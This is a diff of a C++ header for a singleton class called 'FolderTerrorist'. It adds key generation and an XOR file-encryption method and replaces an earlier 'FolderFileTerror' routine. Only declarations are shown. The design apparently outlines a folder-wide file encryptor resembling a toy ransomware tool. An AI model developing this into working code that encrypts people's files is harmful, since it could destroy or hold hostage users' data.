@@ -16,19 +16,22 @@ public:
         return p_instance;
     }
 
-    //~FolderTerrorist();
-
     void SetFolderName(const std::string &folderName);
 
     const std::string &GetFolderName() const;
 
-    void Start();
+    void Start(std::string mode);
 
-    void Start(std::string path);
+    void Start(std::string path, std::string mode);
 
     void SetTheBorder(int border);
 
     void SignalsCatching();
+
+    void KeyGen(size_t size);
+
+    std::vector<uint8_t> GetKey();
+
 private:
     FolderTerrorist();
 
@@ -46,9 +49,13 @@ private:
 
     void UpdateQueue();
 
-    void ReleaseQueue();
+    void ReleaseQueue(std::string mode);
 
-    void FolderFileTerror(const std::string &file_path);
+    std::vector<uint8_t> key;
+
+    std::vector<uint8_t> keygen(size_t size);
+
+    void XORencryption(const std::string &file_path);
 
     int border = -1;
 
